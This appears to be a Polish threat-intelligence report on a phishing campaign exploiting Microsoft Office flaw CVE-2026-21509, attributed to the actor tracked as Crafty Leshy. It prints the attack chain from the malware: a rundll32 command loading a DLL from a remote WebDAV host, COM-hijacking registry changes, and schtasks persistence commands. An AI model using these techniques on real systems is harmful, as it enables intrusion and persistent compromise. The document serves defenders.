---
title: Pierwszy raport
description: Minimalny przyklad wpisu w Markdown.
date: 2026-03-15
draft: false
---

#     CVE-2026-21509

## 



W dniu 26.01.2026 r. firma Microsoft poinformowała o zidentyfikowaniu nowej podatności w produkcie Microsoft Office, oznaczonej identyfikatorem CVE-2026-21509.
Analitycy DKWOC, prowadzący bieżące monitorowanie aktywności adwersarzy zidentyfikowali artefakty pozwalające potwierdzić aktywne wykorzystanie luki 
w kampaniach wymierzonych zarówno w instytucje krajowe, jak i zagraniczne już w dniu 30.01.2026 r. (cztery dni po publikacji informacji o podatności) 
Przeprowadzona analiza wskazuje, iż adwersarz rozpoczął prace nad uzbrojeniem złośliwych dokumentów kolejnego dnia po upublicznieniu podatności.
Pomimo szerokiego zasięgu kampanii, działania adwersarza miały charakter ukierunkowany o czym świadczy precyzyjne typowanie instytucji, jak i konkretnych osób w ich strukturach. Na szczególną uwagę zasługuje fakt, 
iż w celu zwiększenia wiarygodności wiadomości phishingowych wykorzystano przejęte konta poczty elektronicznej 
instytucji państwowych z krajów Europy Środkowo-Wschodniej, w tym m.in. z Ukrainy oraz Rumunii. (Odnotowano również dystrybucję wiadomości z przejętych kont pocztowych z innych regionów, natomiast w znacznej mniejszości). 
Treści wiadomości były spójne z profilem działalności zarówno nadawcy, jak i odbiorcy.
Uwzględniając powyższe fakty, należy ocenić, iż kampania została zrealizowana w sposób minimalizujący ryzyko wykrycia przez odbiorców symptomów ataku phishingowego. Takie podejście istotnie zwiększa prawdopodobieństwo skutecznej infekcji oraz 
stwarza warunki do utrzymania długotrwałej persystencji adwersarza w skompromitowanych systemach.

W ocenie analityków aktywność ta jest powiązana ze zbiorem śledzonym przez DKWOC pod nazwą Crafty Leshy w skład którego wchodzi m. in. zbiór aktywności śledzony przez CERT UA pod nazwą UAC-0001. 

## Na czym polega podatność CVE-2026-21509.

Podatność CVE-2026-21509 wynika z nieprawidłowej walidacji danych wejściowych wykorzystywanych przez Microsoft Office podczas podejmowania decyzji bezpieczeństwa. Została ona sklasyfikowana jako CWE-807: Reliance on Untrusted Inputs in a Security Decision,
a wartość zagrożenia została oszacowana na poziomie 7.9 w 10 stopniowej skali CVSS:3.1 (/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H/E:F/RL:O/RC:C) //https://nvd.nist.gov/vuln/detail/CVE-2026-21509 //https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21509

Microsoft w aktualizacji bezpieczeństwa MS10-036 zastosował mechanizm ochronny polegający na blokowaniu możliwości uruchomienia niebezpiecznych obiektów COM (ang. Component Object Model) osadzonych w dokumentach pakietu Office, poprzez zastowozanie Compatibility Flags (tzw. kill bits).    //https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model   //https://support.microsoft.com/en-us/topic/security-settings-for-com-objects-in-office-b08a031c-0ab8-3796-b8ec-a89f9dbb443d

W przypadku CVE-2026-21509 atakujący może spreparować dokument, który omija proces walidacji Compatibility Flags, skutkując załadowaniem obiektu COM i wykonanie okeślonej dla niego akcji, a jedyna wymagana akcja po stronie użytkownika to otwarcie złośliwego dokumentu. (Podatniość nie działa w trybie podglądu np. z poziomu MS Outlook)

## Analiza ataku

Pierwszym etapem zaobserwowanego ataku było dostarczenie wiadomości phishingowych do odbiorców. Jak wcześńiej wspomniano adwersarz wykorzystał przejęte skrzynki pocztowe instytucji państwowych m. in. Ukrainy i Rumunii, a treści wiadomości były spójne z profilem działalności zarówno nadawcy, jak i odbiorcy, co zwiększało wiarygodność korespondencji.

<img width="865" height="393" alt="image" src="https://github.com/user-attachments/assets/65b41a24-ec78-4ae4-b2d5-9590c1b8a0ae" />

<img width="791" height="447" alt="image" src="https://github.com/user-attachments/assets/c2656385-8932-4a4b-ad48-2cd0754237e3" />

W przesłanym dokumencie osadzony został obiekt OLE Shell.Explorer.1 (CLSID: EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B), który pełni rolę komponentu powłoki systemu Windows (Internet Explorer / Windows Explorer). Jego inicjalizacja skutkuje pobraniem oraz wykonaniem pliku skrótu `.lnk` umieszczonego na zdalnym zasobie sieciowym WebDAV.

<img width="784" height="382" alt="image" src="https://github.com/user-attachments/assets/15cbe3e7-3d40-4510-a68a-494f667de009" />

Skrót odwołuje się do obiektu Panelu sterowania systemu Windows, wykorzystując osadzony identyfikator klasy `Control Panel – All Control Panel Items` (CLSID: 26EE0668-A00A-44D7-9371-BEB064C98683). W rezultacie system Windows interpretuje wskazaną ścieżkę jako element Panelu sterowania i podejmuje próbę otwarcia zasobu znajdującego się w zdalnej lokalizacji WebDAV jako pliku typu .cpl (pliki .cpl są w istocie bibliotekami DLL). Mechanizm ten prowadzi do uruchomienia polecenia: `rundll32.exe shell32.dll,Control_RunDLL "\\freefoodaid.com@SSL\tables\tables.d"` co skutkuje załadowaniem i wykonaniem złośliwej biblioteki DLL bezpośrednio z zasobu sieciowego. 

<img width="764" height="335" alt="Zrzut ekranu 2026-02-04 084000" src="https://github.com/user-attachments/assets/d31c5d51-870a-4076-83f3-4cc6ac06ad59" />

W analizowanym przypadku bibliioteka pełni rolę droppera, którego zadaniem jest odszyfrowanie (algorytmem XOR) osadzonych w nim bloków danych i zapisania ich w określonych lokalizacjach na dysku infekowanego urządzenia.

`%programdata%\Microsoft OneDrive\setup\Cache\SplashScreen.png`
`%programdata%\USOPublic\Data\User\EhStoreShell.dll`
`%temp%\Diagnostics\office.xml`

<img width="628" height="390" alt="image" src="https://github.com/user-attachments/assets/7aaf8c15-ca9d-42f3-9def-eb41233f9982" />


W dalszej kolejnoSci z wykorzystaniem techniki COM Hijacking w celu zachowania długotrwałej persystencji modyfikuje klucz rejestru `HKCU\Software\Classes\CLSID\{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}\InProcServer32` wskazując na lokalizację `%programdata%\USOPublic\Data\User\EhStoreShell.dll` oraz ustawia wartość ThreatdingModel na Apartment (Single-Threaded Apartment (STA)) \\https://learn.microsoft.com/en-us/windows/win32/com/single-threaded-apartments. Zmieniony w tej fazie komponent odpowiada za obsługę Shell Icon Overlay Handler, który jest inicjowany automatycznie w kontekście procesu explorer.exe podczas jego uruchomienia. \\https://strontic.github.io/xcyclopedia/library/clsid_D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D.html   \\https://strontic.github.io/xcyclopedia/library/clsid_D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D.html

<img width="728" height="581" alt="image" src="https://github.com/user-attachments/assets/19032e05-7c9a-4a1d-a1ca-43e57bcfa50d" />
  
Następnie tworzone jest zaplanowane zadanie systemowe na podstawie wcześńiej wygenerowanego pliku .xml, z wykorzystnaniem polecenia: `schtasks.exe /Create /tn "OneDriveHealth" /XML "%temp%\Diagnostics\office.xml"`. Zadanie to uruchamiane jest po upływie jednej minuty i ma na celu wykonanie komendy: `%windir%\system32\cmd.exe /c (taskkill /f /IM explorer.exe >nul 2>&1) & (start explorer >nul 2>&1) & (schtasks /delete /f /tn neDriveHealth)`. Efektem jego działania jest zresetowanie procesu explorer.exe co prowadzi do ponownej inicjalizacji komponentów powłoki systemu Windows i uruchomienia złośliwej biblioteki DLL zarejestrowanej poprzez opsany wcześniej COM Hijacking. Mechanizm ten umożliwia uruchomienie kolejnych etapów infekcji.

<img width="690" height="461" alt="image" src="https://github.com/user-attachments/assets/f35ef3f3-4517-40d2-8330-9fd269f9ae63" />

  
W dalszej fazie działania załadowana biblioteka `EhStoreShell.dll` odczytuje plik graficzny `SplashScreen.png` i wydobywa z niego ładunek, ukryty przy użyciu techniki steganograficznej polegającej na ukrywaniu informacji w najmniej znaczących bitach składowych kolorów poszczególnych pikseli (LSB - Least Significant Bit). Wydobyty w ten sposób shellcode jest następnie wykonywany bezpośrednio w pamięci operacyjnej.JPrzeprowadzona analiza wskazuje, iż jest to implant Grunt (stager) powiązany z frameworkiem C2 Covenant, a jako kanał komunikacji wykorzytuje serwis chmurowy filen[.]io . Zastosowane techniki są spójne z wcześniejszymi kampaniami przypisywanymi temu samemu adwersarzowi.


## Analiza lab

Specjaliści DKWOC potwierdzili możliwość wykorzystania podatności z innymi obiektami COM, które również mogą być skuteczne w realizacji złośliwych działań. Należy podkreślić, że podatność dotyczy także pozostałych typów plików pakietu Microsoft Office wykorzystujących mechanizmy COM, co umożliwia adwersarzowi znaczną elastyczność do prowadzenie dalszych działań z jej użyciem. Ponadto w toku szczegółowej analizy próbki, zidentyfikowano artefakty mogące wskazywać, iż operator testował alternatywne sposoby wykorzystania tejże podatności m.in. w połączeniu z wykorzystaniem podatności CVE-2021-40444. Jeden z obiektów dokonuje próby ładowania szablonu z lokalizacji zewnętrznej natomiast w czasie prowadzonej analizy nie otrzymano ładunku toteż jego pzrzeznaczenie nie jest znane.

## Zalecenia

DKWOC zaleca wszystkim użytkownikom Mpakietu Microsoft Office 2016 oraz 2019 niezwłoczne zaktualizowanie oprogramowania do najnowszej dostępnej wersji. Zgodnie z komunikatem firmy Microsoft użytkowanicy wersji 2021 i nowszysch zostali objęci ochroną poprzez wdrożone zmiany po stronie usługi, przy czym ich skuteczna aktywacja wymaga ponownego uruchomienia aplikacji Microsoft Office.  //https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21509

Dodatkowo zaleca się: 
  - eryfikację komunikacji sieciowej pod kątem połączeń z domenami wskazanymi w sekcji IoC
  - przeszukanie systemów pocztowych z wykorzystaniem reguły YARA dołączonej na końcu artykułu, umożliwiającej identyfikację próbek powiązanych z opisywaną kampanią.

W przypadku potwierdzenia obecności złośliwych plików w infrastrukturze lub komunikacji ze wskazanumi domenami, uprasza się o niezwłoczne poinformowanie właściwego CSIRT poziomu krajowego oraz DKWOC.

## Podsumowanie

Celem niniejszego artykułu jest podkreślenie konieczności niezwłocznego stosowania aktualizacji bezpieczeństwa. Jak pokazuje analizowany przypadek, aktor dysponujący wysokim poziomem zaawansowania jest w stanie w bardzo krótkim czasie od momentu publikacji informacji o podatności wykorzystać ją do prowadzenia skutecznych i ukierunkowanych działań ofensywnych.

## Yara


## IoC



[^1]:https://lolbas-project.github.io/lolbas/Binaries/Conhost/
[^2]:https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
[^3]:https://lolbas-project.github.io/lolbas/Binaries/Control/
